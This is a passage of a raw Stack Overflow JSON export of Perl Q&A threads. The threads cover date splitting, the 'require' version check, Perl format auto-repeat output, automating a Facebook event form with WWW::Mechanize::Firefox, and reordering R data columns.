the code</p>\n\n<p>from </p>\n\n<pre><code>push(@marr_date1,split(/-/, $mstr_onlytime1));\npush(@marr_date2,split(/-/, $mstr_onlytime2));\n</code></pre>\n\n<p>to</p>\n\n<pre><code>push( @marr_date2, split( /[-:]/, $mstr_onlydate2 ) );\npush( @marr_date2, split( /[-:]/, $mstr_onlytime2 ) );\n</code></pre>\n\n<p>It works for me.:)</p>\n"}], "owner": {"reputation": 367, "user_id": 4266540, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/GxWGD.jpg?s=128&g=1", "display_name": "Vasanth", "link": "https://stackoverflow.com/users/4266540/vasanth"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 51, "favorite_count": 0, "closed_date": 1455023083, "accepted_answer_id": 35291540, "answer_count": 2, "score": -2, "last_activity_date": 1455019201, "creation_date": 1455017761, "question_id": 35291050, "link": "https://stackoverflow.com/questions/35291050/compare-time-in-perl-using-subroutine", "closed_reason": "Not suitable for this site", "title": "Compare time in perl using subroutine", "body": "<p>I found the script to compare the time and get the return value. But that script not validating the following scenario properly. Please help me on this.</p>\n\n<p>Script Path : <a href=\"http://perlprogramming.language-tutorial.com/2012/10/perl-function-to-compare-two-dates.html#recent\" rel=\"nofollow\">http://perlprogramming.language-tutorial.com/2012/10/perl-function-to-compare-two-dates.html#recent</a></p>\n\n<pre><code>Input : 2015-07-01 00:50:00,2015-07-01 00:00:00, returns : 0\n</code></pre>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 793701, "user_id": 19068, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1d2d3229ed1961d2bd81853242493247?s=128&d=identicon&r=PG", "display_name": "Quentin", "link": "https://stackoverflow.com/users/19068/quentin"}, "edited": false, "score": 4, "creation_date": 1455015996, "post_id": 35290378, "comment_id": 58290538, "body": "You need to be more specific about what you don&#39;t understand."}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 0, "creation_date": 1455016127, "post_id": 35290378, "comment_id": 58290639, "body": "Welcome to Stack Overflow! Maybe start by telling us what you want to do? It sounds like you might try to translate Perl code to some other language. You can <a href=\"https://stackoverflow.com/posts/35290378/edit\">edit</a> your question."}, {"owner": {"reputation": 5835, "user_id": 1446154, "user_type": "registered", "accept_rate": 77, "profile_image": "https://www.gravatar.com/avatar/e203591509f88fc8c8aeadc01dc1a5d1?s=128&d=identicon&r=PG&f=1", "display_name": "Laser", "link": "https://stackoverflow.com/users/1446154/laser"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1455016415, "post_id": 35290378, "comment_id": 58290829, "body": "<code>require</code> - it&#39;s something without what your program should/will not work, you may specify perl version, or some files. Actually your link is very helpful, and please answer on @simbabque question. What you want to do?"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1455033521, "post_id": 35290378, "comment_id": 58303007, "body": "<code>require</code> is very little use. One normally loads a module using <code>use</code> instead, which is a compile-time version of <code>require</code>."}, {"owner": {"reputation": 569, "user_id": 3423750, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e9e5f034a288f311d61b611a62f3e42a?s=128&d=identicon&r=PG", "display_name": "Phalgun", "link": "https://stackoverflow.com/users/3423750/phalgun"}, "edited": false, "score": 0, "creation_date": 1455050182, "post_id": 35290378, "comment_id": 58313514, "body": "I&#39;d chat with @alekh-chaudhary, wherein he wanted to understand the use of &#39;require &lt;perl-version&gt;&#39;"}, {"owner": {"reputation": 63, "user_id": 5867873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/808dc2626687f6b8ff6201af252389ee?s=128&d=identicon&r=PG&f=1", "display_name": "alekh chaudhary", "link": "https://stackoverflow.com/users/5867873/alekh-chaudhary"}, "reply_to_user": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "edited": false, "score": 1, "creation_date": 1455521004, "post_id": 35290378, "comment_id": 58508581, "body": "@simbabque is the question clearer now?"}], "answers": [{"comments": [{"owner": {"reputation": 569, "user_id": 3423750, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e9e5f034a288f311d61b611a62f3e42a?s=128&d=identicon&r=PG", "display_name": "Phalgun", "link": "https://stackoverflow.com/users/3423750/phalgun"}, "edited": false, "score": 0, "creation_date": 1455820632, "post_id": 35409310, "comment_id": 58672420, "body": "Could it be explained with an example, in what scenarios might one need to use it?"}, {"owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "reply_to_user": {"reputation": 569, "user_id": 3423750, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e9e5f034a288f311d61b611a62f3e42a?s=128&d=identicon&r=PG", "display_name": "Phalgun", "link": "https://stackoverflow.com/users/3423750/phalgun"}, "edited": false, "score": 0, "creation_date": 1455870717, "post_id": 35409310, "comment_id": 58692780, "body": "@Phalgun I added a few examples from CPAN"}, {"owner": {"reputation": 569, "user_id": 3423750, "user_type": "registered", "accept_rate": 76, "profile_image": "https://www.gravatar.com/avatar/e9e5f034a288f311d61b611a62f3e42a?s=128&d=identicon&r=PG", "display_name": "Phalgun", "link": "https://stackoverflow.com/users/3423750/phalgun"}, "edited": false, "score": 0, "creation_date": 1455874388, "post_id": 35409310, "comment_id": 58694825, "body": "Thanks for the explanation!"}], "tags": [], "owner": {"reputation": 50468, "user_id": 1331451, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/4ZPmj.png?s=128&g=1", "display_name": "simbabque", "link": "https://stackoverflow.com/users/1331451/simbabque"}, "is_accepted": true, "score": 2, "last_activity_date": 1455871468, "last_edit_date": 1455871468, "creation_date": 1455539002, "answer_id": 35409310, "question_id": 35290378, "link": "https://stackoverflow.com/questions/35290378/understand-use-of-require-in-perl/35409310#35409310", "title": "Understand use of require in Perl", "body": "<p>The documentation you have linked and quotes explains this on the very first page, without scrolling. (Emphasis mine).</p>\n\n<blockquote>\n  <p><strong>VERSION may be either a numeric argument such as 5.006, which will be\n  compared to <code>$]</code></strong> , or a literal of the form v5.6.1, which will be\n  compared to $^V (aka $PERL_VERSION). <strong>An exception is raised if VERSION\n  is greater than the version of the current Perl interpreter.</strong> Compare\n  with use, which can do a similar check at compile time.</p>\n</blockquote>\n\n<p>One paragraph down is this example.</p>\n\n<blockquote>\n<pre><code>require v5.6.1;     # run time version check\nrequire 5.6.1;      # ditto\nrequire 5.006_001;  # ditto; preferred for backwards\n                      compatibility\n</code></pre>\n</blockquote>\n\n<p>So it's pretty clear what it does. It <em>requires</em> your Perl to be at least  5.6.1 at run time. If you have 5.22, all is well.</p>\n\n<h2>Examples on CPAN</h2>\n\n<p>Finding cases where this feature is used is pretty simple with <a href=\"http://grep.cpan.me/?q=require%205.012\" rel=\"nofollow\">grep.cpan.me</a>, but actually getting some with a decent explanation required a bit of searching<sup>1</sup>.</p>\n\n<ul>\n<li><p><a href=\"https://metacpan.org/pod/Astro::App::Satpass2\" rel=\"nofollow\">Astro::App::Satpass2</a> is using <code>require 5.012</code> and <code>require 5.010</code> <a href=\"https://metacpan.org/source/WYANT/Astro-App-Satpass2-0.030/inc/My/Module/Recommend.pm#L12\" rel=\"nofollow\">in its lib module My::Module::Recommend</a>. Apparently there are some big number features it needs <a href=\"https://metacpan.org/source/WYANT/Astro-App-Satpass2-0.030/inc/My/Module/Recommend.pm#L167\" rel=\"nofollow\">that don't work on older Perls</a>.</p></li>\n<li><p><a href=\"http://p3rl.org/Barcode::Code128\" rel=\"nofollow\">Barcode::Code128</a> has <a href=\"https://metacpan.org/source/WRW/Barcode-Code128-2.21/lib/Barcode/Code128.pm#L1\" rel=\"nofollow\"><code>require 5.010</code></a>, but its <a href=\"https://metacpan.org/pod/Barcode::Code128#REQUIRES\" rel=\"nofollow\">documentation</a> says it needs Perl 5.004.</p></li>\n<li><p><a href=\"https://metacpan.org/pod/Mail::SpamAssassin\" rel=\"nofollow\">Mail::SpamAssassin</a> says <a href=\"https://metacpan.org/source/KMCGRAIL/Mail-SpamAssassin-3.4.1/Changes#L415\" rel=\"nofollow\">in its changelog</a> that a <code>require 5.008001</code> was added to fix a bug with a missing <code>utf8::is_utf8()</code>.</p></li>\n</ul>\n\n<p>The last one is a good example of the different number styles. Not only does it need a specific sub-version of 5.08, it also leaves out the <code>_</code>, which can be used anywhere in numbers to make them more readable in Perl.</p>\n\n<p>A more hands-on example, but harder to find on CPAN, would be if you absolutely need to use a specific syntax feature that only became available in a very recent Perl, like the <code>/r</code> flag on the substitution operator <code>s///</code>, that adds non-destructive substitution, so the result is returned instead of the string manipulated. <a href=\"http://perldoc.perl.org/5.14.0/perldelta.html#Non-destructive-substitution\" rel=\"nofollow\">It was added in Perl 5.014</a>. If your code depends on that, you would put <code>require 5.014</code> at the top so it doesn't even try to run on older Perls as it would fail anyway.</p>\n\n<pre><code>return $foo-&gt;frobnicate(\n  id =&gt; $params-&gt;{id},\n  text_without_whitespace =&gt; $params-&gt;{text} =~ s/\\s+//gr,\n);\n</code></pre>\n\n<hr>\n\n<p><sup>1) Reading the CPAN is useful. Do it.</sup></p>\n"}], "owner": {"reputation": 63, "user_id": 5867873, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/808dc2626687f6b8ff6201af252389ee?s=128&d=identicon&r=PG&f=1", "display_name": "alekh chaudhary", "link": "https://stackoverflow.com/users/5867873/alekh-chaudhary"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 177, "favorite_count": 1, "accepted_answer_id": 35409310, "answer_count": 1, "score": -2, "last_activity_date": 1455871468, "creation_date": 1455015884, "last_edit_date": 1455055362, "question_id": 35290378, "link": "https://stackoverflow.com/questions/35290378/understand-use-of-require-in-perl", "title": "Understand use of require in Perl", "body": "<p>What is the use of the keyword 'require' in perl. I have referred  <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"nofollow\">require</a> but it is not very helpful.</p>\n\n<p>From <a href=\"http://perldoc.perl.org/functions/require.html\" rel=\"nofollow\" title=\"require\">http://perldoc.perl.org/functions/require.html</a></p>\n\n<blockquote>\n  <p>require Demands a version of Perl specified by VERSION, or demands\n  some semantics specified by EXPR or by $_ if EXPR is not supplied.\n  VERSION may be either a numeric argument such as 5.006, which will be\n  compared to $] , or a literal of the form v5.6.1, which will be\n  compared to $^V (aka $PERL_VERSION). An exception is raised if VERSION\n  is greater than the version of the current Perl interpreter. Compare\n  with use, which can do a similar check at compile time.</p>\n</blockquote>\n\n<p>From this it is not quite clear what the below line of code implies in a PERL script on a Linux machine with a higher version of PERL install(say 5.22):-</p>\n\n<pre><code>require 5.006_001;\n</code></pre>\n\n<p>Could it be explained with an example, in what scenarios might one need to use it?</p>\n"}, {"tags": ["perl", "csv", "format"], "comments": [{"owner": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1455009252, "post_id": 35287867, "comment_id": 58286095, "body": "Can you give some example input and output? I&#39;d usually suggest looking at say, <code>sprintf</code> if you&#39;ve more complex formatting requirements."}, {"owner": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "reply_to_user": {"reputation": 51521, "user_id": 2566198, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/Y34ZA.jpg?s=128&g=1", "display_name": "Sobrique", "link": "https://stackoverflow.com/users/2566198/sobrique"}, "edited": false, "score": 0, "creation_date": 1455010456, "post_id": 35287867, "comment_id": 58286851, "body": "I have put in examples of current and desired outputs. I don&#39;t really need complex formatting, just looking for probably a more flexible way of formatting the output such that I can display data fully and without trailing empty lines."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1455012328, "post_id": 35287867, "comment_id": 58288166, "body": "Perl&#39;s <code>format</code> system is very rarely used, and I recommend that you go to the <a href=\"http://metacpan.org/module/Perl6::Form\" rel=\"nofollow noreferrer\">Perl6::Form</a> module, which is a backwards port of the Perl 6 form system to Perl 5 and does things &quot;properly&quot;. I don&#39;t know whether it does what you&#39;re asking for, which is why this is a comment and not a solution, but I&#39;ll take a look shortly"}], "answers": [{"comments": [{"owner": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "edited": false, "score": 0, "creation_date": 1455020728, "post_id": 35290584, "comment_id": 58293744, "body": "thanks a lot for your answer, this is exactly what I am looking for! As I cannot post my actual data here, the outputs I put in my question was made up and formatted by hand just for illustration purpose, really sorry if that caused any inconvenience to you, I will take note of that! And thanks again for your answer!"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "edited": false, "score": 1, "creation_date": 1455022094, "post_id": 35290584, "comment_id": 58294677, "body": "I realise that it may be impossible to publish confidential data. But you have created some sample data that you could have shown together with your code. I had to work backwards from your output data to create what I think your input looks like, but I can&#39;t see any way to get Perl to split <code>this is a short description</code> without putting the space between <code>short</code> and <code>description</code> somewhere. I have done it by using <code>this is a shortdescription</code> instead, and setting <code>$:</code> to <code>undef</code>, but it is a shame when it takes longer to recreate the problem than it does to resolve it"}, {"owner": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "edited": false, "score": 0, "creation_date": 1455024133, "post_id": 35290584, "comment_id": 58296015, "body": "Ok noted, thanks a lot! I will take your advice for future questions!"}], "tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 1, "last_activity_date": 1467889957, "last_edit_date": 1467889957, "creation_date": 1455016498, "answer_id": 35290584, "question_id": 35287867, "link": "https://stackoverflow.com/questions/35287867/perl-format-output-and-read-formatted-data/35290584#35290584", "title": "Perl - format output and read formatted data", "body": "<p>It's around five years since I last looked at <code>format</code>, but I think what you need is the auto-repeat flag <code>~~</code> which indicates that a format line should be re-used until the variables have been emptied</p>\n\n<p>You've made it very difficult to write something that works, as you've given us no data, and the format statement you show can't have produced that output because the field widths are different. You must also have messed with <code>$:</code> (<code>$FORMAT_LINE_BREAK_CHARACTERS</code>) to get your output split like that but you don't mention it</p>\n\n<p>Here's some code that generates what you asked for except for limiting the number of rows of output. You can't do a multi-line auto-fill as well as limiting the number of lines, and it seems that you will need to use <code>substr</code> to limit the length of <code>$description</code> if it exceeds 75 characters (5 lines of 15 characters)</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy ( $ID, $description, $att, $errors, $location );\n\nformat STDOUT =\n@&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;, @&lt;&lt;&lt;&lt;, @&lt;&lt;&lt;&lt;&lt;\n$ID,   $description,    $att,  $errors, $location\n      , ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;, ~~\n       $description,    $att\n\n.\n\nlocal $:;\n\n( $ID, $description, $att, $errors, $location ) = (\n    '13_456',\n    'this is a example of a line that if follow the current format would be truncated at the end of the fifth line',\n    'val1:x; va12: y',\n    3,\n    'fold1',\n);\n\nwrite STDOUT;\n\n( $ID, $description, $att, $errors, $location ) = (\n    '12_456',\n    'this is a shortdescription',\n    'val1:a; val2: b',\n    3, 'fold2',\n);\n\nwrite STDOUT;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>13_456, this is a examp, val1:, 3    , fold1\n      , le of a line th, x; va,\n      , at if follow th, 12: y,\n      , e current forma,      ,\n      , t would be trun,      ,\n      , cated at the en,      ,\n      , d of the fifth ,      ,\n      , line           ,      ,\n\n12_456, this is a short, val1:, 3    , fold2\n      , description    , a; va,\n      ,                , l2: b,\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "edited": false, "score": 0, "creation_date": 1455459652, "post_id": 35292794, "comment_id": 58489421, "body": "Might the downvoters please be so kind to explain why they downvoted this?"}], "tags": [], "owner": {"reputation": 6130, "user_id": 299242, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/f9bda794bc71267206358bf04ea0a179?s=128&d=identicon&r=PG", "display_name": "mscha", "link": "https://stackoverflow.com/users/299242/mscha"}, "is_accepted": false, "score": -2, "last_activity_date": 1455022931, "creation_date": 1455022931, "answer_id": 35292794, "question_id": 35287867, "link": "https://stackoverflow.com/questions/35287867/perl-format-output-and-read-formatted-data/35292794#35292794", "title": "Perl - format output and read formatted data", "body": "<p>Don't try to reinvent the wheel, use a module that's specialized for the task at hand: <a href=\"https://metacpan.org/pod/Text::CSV\" rel=\"nofollow\">Text::CSV</a>.</p>\n"}], "owner": {"reputation": 801, "user_id": 4652826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/811835123cd52e84642a1b972b9bd77a?s=128&d=identicon&r=PG&f=1", "display_name": "annena", "link": "https://stackoverflow.com/users/4652826/annena"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 313, "favorite_count": 1, "accepted_answer_id": 35290584, "answer_count": 2, "score": 0, "last_activity_date": 1467889957, "creation_date": 1455008885, "last_edit_date": 1455023875, "question_id": 35287867, "link": "https://stackoverflow.com/questions/35287867/perl-format-output-and-read-formatted-data", "title": "Perl - format output and read formatted data", "body": "<p>I'm trying to write some data into CSV files and also read back those data. For better readability, I have used Perl format to create a table-like appearance, and for the data to be displayed in proper columns when opened in Excel, I have used commas to separate the columns. My table is a list of IDs with its respective attributes. Below is the format I am using to display each ID:</p>\n\n<pre><code>format TABLE = \n@&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;, @&lt;&lt;&lt;&lt;, @&lt;&lt;&lt;&lt;&lt;\n$ID,   $description,    $att,  $errors, $location\n      , ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;,\n       $description,    $att\n      , ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;, ^&lt;&lt;&lt;&lt;,\n       $description,    $att\n      , ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\n      $description\n      , ^&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;\n      $description\n.\n</code></pre>\n\n<p>The problem I am having with this format is that the number of lines reserved to display <code>$description</code> and <code>$att</code> is fixed. If my string is longer than that it would be truncated and if shorter than 5 lines there will always be empty lines being displayed. Since the length of the <code>$description</code> string is not predictable, is there any way to make sure the content would be fully displayed even if it's longer and without trailing empty lines even if it's shorter than the number of specified lines in the format?</p>\n\n<p>Current output:</p>\n\n<pre><code>13_456, this is a examp, val1:, 3    , fold1\n      , le of a line th, x; va,\n      , at if follow th, l2: y,\n      , e current forma,\n      , t would be trun,\n\n12_456, this is a short, val1:, 0    , fold2\n      ,  description   , a; va,\n      ,                , l2: b,\n      ,                ,\n      ,                ,\n</code></pre>\n\n<p>Desired output:</p>\n\n<pre><code>13_456, this is a examp, val1:, 3    , fold1\n      , le of a line th, x; va,\n      , at if follow th, l2: y,\n      , e current forma,\n      , t would be trun,\n      , cated          ,\n\n12_456, this is a short, val1:, 0    , fold2\n      ,  description   , a; va,\n      ,                , l2: b,\n</code></pre>\n\n<p>For reading from file, I am able to parse the file line by line to match the <code>$ID</code> pattern and retrieve all the information for that ID (<code>$description</code>, <code>$att</code>, <code>$errors</code>, <code>$location</code>). But since I am printing out data using Perl format, I'm just wondering if I can make use of this format to read back the data, ie does Perl provide any library/functionality that helps read data that fits a specified Perl format? I have done some research but have not seemed to find one, any help is greatly appreciated.</p>\n"}, {"tags": ["facebook", "perl", "www-mechanize-firefox"], "comments": [{"owner": {"reputation": 4782, "user_id": 101130, "user_type": "registered", "profile_image": "https://graph.facebook.com/690267162/picture?type=large", "display_name": "WizKid", "link": "https://stackoverflow.com/users/101130/wizkid"}, "edited": false, "score": 2, "creation_date": 1454994050, "post_id": 35284102, "comment_id": 58279389, "body": "There is no API for a reason. Trying to automate it will just break over and over again."}], "owner": {"reputation": 2287, "user_id": 1641112, "user_type": "registered", "accept_rate": 46, "profile_image": "https://www.gravatar.com/avatar/00bee18fb974a0057fb61a56faf66052?s=128&d=identicon&r=PG", "display_name": "StevieD", "link": "https://stackoverflow.com/users/1641112/stevied"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 206, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1455029840, "creation_date": 1454993309, "last_edit_date": 1455029840, "question_id": 35284102, "link": "https://stackoverflow.com/questions/35284102/how-to-input-text-into-facebooks-event-form-with-wwwmechanizefirefox", "title": "How to input text into Facebook&#39;s event form with WWW::Mechanize::Firefox?", "body": "<p>Facebook has no API for submitting an event to a Facebook page. So I'm attempting to use WWW::Mechanize::Firefox with this script.</p>\n\n<pre><code>use strict;\nuse warnings;\nuse feature qw(say);\nuse WWW::Mechanize::Firefox;\n\nmy $mech = WWW::Mechanize::Firefox-&gt;new(activate =&gt; 1); \n$mech-&gt;autoclose_tab(0);\n$mech-&gt;get('http://facebook.com');\n\nif ($mech-&gt;title eq 'Facebook - Log In or Sign Up') {\n  $mech-&gt;submit_form(\n    with_fields =&gt; {\n      email    =&gt; 'my@email.com',\n      pass =&gt; 'my_password',\n    }   \n  );  \n}\nsleep(1);\n\n$mech-&gt;get('https://www.facebook.com/PageName/events');\nmy $page_id = 777777777777777;\n\n$mech-&gt;click({ synchronize =&gt; 0, xpath =&gt; '//a[text() = \"Create Event\"]' }, 10, 10);\nsleep(3);\n\n# selects all input fields and sets value to 'hello world'\n# even though values are set, the fields remain blank\nmy @selectors = $mech-&gt;selector('input');\nforeach my $selector (@selectors) {\n  $mech-&gt;field( $selector, 'hello world');\n}\n\n# attempts to publish event, results in form errors because fields are blank\n$mech-&gt;click({ synchronize =&gt; 0, xpath =&gt; '//button[text() = \"Publish\"]' });\n\n# test to see if values are getting set.\n# this returns 'hello world' as so values are getting set\nsay $mech-&gt;value($selectors[2]); \n\n# test to see if an input field can be selected with an xpath\n# this works\n$mech-&gt;click({ synchronize =&gt; 0, xpath =&gt; '//input[@placeholder=\"Include a place or address\"]' });\n</code></pre>\n\n<p>The form generated by Facebook does not make it easy to input data into the text fields. The fields have no name property and they are not distinguishable with a css selector (though they can be selected with an xpath) as seen in last line.</p>\n\n<p>Because there is no way to input text into the fields, Facebook throws errors because it sees the fields as blank even though I successfully put values into the fields using <code>$mech-&gt;field</code>.</p>\n\n<p>Is there any way to get text into Facebook's form for adding events?</p>\n\n<p><strong><em>UPDATE</em></strong>\nI made a little progress on this. I was able to at least get some of the fields filled out (<code>Event name</code> and <code>Location</code>) using this code:</p>\n\n<pre><code>my $field = $mech-&gt;xpath( '//input[@placeholder=\"Include a place or address\"]', one =&gt; 1);\n$field-&gt;{value} = 'Room 315, City Hall';\n\n$field = $mech-&gt;xpath( '//input[@placeholder=\"Add a short, clear name\"]', one =&gt; 1);\n$field-&gt;__click;\n$field-&gt;{value} = \"License committee meeting\";\n</code></pre>\n\n<p>Unfortunately, when I click on the \"Publish\" button with this code:</p>\n\n<pre><code>$mech-&gt;click({ synchronize =&gt; 0, xpath =&gt; '//button[text() = \"Publish\"]' }, 10, 10);\n</code></pre>\n\n<p>the <code>Event Name</code> and <code>Location</code> text fields get cleared as if nothing was entered. Not sure what else to try at this point.</p>\n"}, {"tags": ["r", "bash", "perl", "awk"], "comments": [{"owner": {"reputation": 87649, "user_id": 17389, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/cd06d1314817ce946ab796af8750b56a?s=128&d=identicon&r=PG", "display_name": "ysth", "link": "https://stackoverflow.com/users/17389/ysth"}, "edited": false, "score": 0, "creation_date": 1454990685, "post_id": 35283383, "comment_id": 58278399, "body": "Are the fields separated by space or any whitespace?  Are there ever any quotes or escapes, e.g. <code>&quot;Green Onion&quot; 1 2 3 4</code> or <code>Green\\ Onion 1 2 3 4</code>"}], "answers": [{"comments": [{"owner": {"reputation": 80563, "user_id": 496803, "user_type": "registered", "accept_rate": 93, "profile_image": "https://www.gravatar.com/avatar/b8556bc403e46083a0cac69f902fa04f?s=128&d=identicon&r=PG", "display_name": "thelatemail", "link": "https://stackoverflow.com/users/496803/thelatemail"}, "edited": false, "score": 0, "creation_date": 1454989655, "post_id": 35283472, "comment_id": 58278172, "body": "In base R, just <code>common &lt;- intersect(names(dat1),names(dat2)); dat1 &lt;- dat1[c(setdiff(names(dat1),ints),ints)]</code> etc would be equivalent."}, {"owner": {"reputation": 18926, "user_id": 2994949, "user_type": "registered", "accept_rate": 64, "profile_image": "https://www.gravatar.com/avatar/e4693362f3fba629ac8706645b9ab577?s=128&d=identicon&r=PG&f=1", "display_name": "rawr", "link": "https://stackoverflow.com/users/2994949/rawr"}, "edited": false, "score": 0, "creation_date": 1454990768, "post_id": 35283472, "comment_id": 58278421, "body": "and the dplyr/ggplot equivalent <code>library(dplyr); library(ggplot2); as_data_frame(dt1)[ndt1[1] %&gt;% c(setdiff(ndt1, common)) %&gt;% c(common)]</code>"}, {"owner": {"reputation": 149, "user_id": 3591048, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/vr3Mm.jpg?s=128&g=1", "display_name": "theo4786", "link": "https://stackoverflow.com/users/3591048/theo4786"}, "edited": false, "score": 0, "creation_date": 1455047575, "post_id": 35283472, "comment_id": 58312058, "body": "How could these answers be modified if one file were to be a subset of the other (not all columns from file 1 are in file2)?"}, {"owner": {"reputation": 598, "user_id": 5775367, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/981bea2526f6952df043a2b7e4ed47dc?s=128&d=identicon&r=PG&f=1", "display_name": "Carlos Alberto", "link": "https://stackoverflow.com/users/5775367/carlos-alberto"}, "edited": false, "score": 0, "creation_date": 1455048588, "post_id": 35283472, "comment_id": 58312591, "body": "can you provide an example? the script does not assume there is any shared columns... or the other way around. if all columns of 1 are in 2, then you will just have <code>setdiff(ndt1, common)</code>  empty."}, {"owner": {"reputation": 5701, "user_id": 35812, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e663162cefd6ac833e0555933b8583f?s=128&d=identicon&r=PG", "display_name": "Chris Charley", "link": "https://stackoverflow.com/users/35812/chris-charley"}, "reply_to_user": {"reputation": 149, "user_id": 3591048, "user_type": "registered", "accept_rate": 64, "profile_image": "https://i.stack.imgur.com/vr3Mm.jpg?s=128&g=1", "display_name": "theo4786", "link": 